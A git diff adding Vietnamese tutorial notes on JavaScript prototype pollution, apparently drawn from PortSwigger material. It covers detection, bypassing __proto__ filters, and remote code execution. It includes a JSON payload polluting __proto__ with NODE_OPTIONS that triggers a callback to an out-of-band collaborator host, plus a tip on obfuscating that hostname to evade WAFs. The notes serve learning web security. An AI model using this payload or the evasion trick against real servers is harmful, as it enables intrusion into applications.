@@ -92,4 +92,43 @@ Sau đó có thể tham chiếu đến `Object()` thong qua hàm tích hợp sã
 myObjectLiteral.constructor            // function Object(){...}
 myObject.constructor                   // function Object(){...}
 ```
+```js
+myObject.constructor.prototype        // Object.prototype
+myString.constructor.prototype        // String.prototype
+myArray.constructor.prototype         // Array.prototype
+```
+Vì `myObject.constructr.prototype` tương đương `myObject.__proto__` điều này cung cấp một hướng thay thế sự ô nhiễm nguyên mẫu.
 
+## Ô nhiễm nguyên mẫu phía máy chủ
+Kỹ thuật phát hiện lỗi tấn công bằng cách làm  ô nhiễm nguyên mẫu phía máy chủ (black box detection)
+## Phát hiện sự ô nhiễm nguyên mẫu phía máy chủ thông qua phản chiếu thuộc tính bị ô nhiễm.
+Một lỗi mà các nhà phát triển dễ mắc phải là quên hoặc bỏ qua thực tế rằng `for...in` vòng lặp JavaScript sẽ lặp qua tất cả các thuộc tính có thể liệt kê của một đối tượng, bao gồm cả những thuộc tính mà nó kế thừa thông qua chuỗi nguyên mẫu.
+## Phát hiện ô nhiễm nguyên mẫu phía máy chủ mà không cần phản ánh thuộc tính bị ô nhiễm
+Có thể xem xét các kỹ thuật sau:
+```
+Ghi đè mã trạng thái
+Ghi đè khoảng trắng Json
+Ghi đè bẳng ký tự
+```
+## Ghi đè bảng ký tự
+Các máy chủ Express thường triển khai các mô đun "middleware" cho phép xử lý trước các yêu cầu khi chúng được chuyển đến hàm xử lý thích hợp. <br>
+`Body-parser` mô đun thường được xử lý sử dụng phân tích phần thân của các yêu cầu đến nhằm tạo ra một `req.body`.
+## Bỏ qua các bộ lọc đầu vào để ngắn chặn sự xâm phạm nguyên mẫu phía máy chủ
+Các trang web thường xuyên cố gắng ngăn chặn hoặc các lỗ hổng do tấn công bằng cách lọc các khóa đáng ngờ như `__proto__` <br>
+Các ứng dụng Node cũng có thể xóa hoặc vô hiệu hóa `__proto__` hoàn toàn bằng cách sử dụng các dòng lệnh `--disable-proto=delete` . Tuy nhiên có thể bỏ qua bằng cách sử dụng kỹ thuật tạo hàm.
+## Thực thi mã từ xa thông qua việc làm ô nhiễm nguyên mẫu phía máy chủ
+### Xác định yêu cầu dễ bị tổn thương
+Trong Node.js có điểm thực lệnh tiềm năng, nhiều điểm trong số đó nằm trong module `child_process`. Chúng được thường gọi là bởi yêu cầu xảy ra không đồng bộ yêu cầu mà dùng làm ô nhiễm tham số <br>
+Biến `NODE_OPTIONS` môi trường cho phép định nghĩa một chuỗi các đối số dòng lệnh sẽ được sử dụng mặc định mỗi khi tạo tiến trình Node mới. <br>
+```json
+"__proto__": {
+    "shell":"node",
+    "NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com"
+}
+```
+Bypass
+```txt
+Việc sử dụng dấu ngoặc kép thoát trong tên máy chủ không hoàn toàn cần thiết. Tuy nhiên, điều này có thể giúp giảm thiểu các trường hợp nhận diện sai bằng cách làm mờ tên máy chủ để tránh bị tường lửa ứng dụng web (WAF) và các hệ thống khác thu thập tên máy chủ phát hiện.
+```
+## Ngăn ngừa lỗ hổng ô nhiễm tham số
+<a href="https://portswigger.net/web-security/prototype-pollution/preventing">Ngăn ngừa lỗ hổng</a>
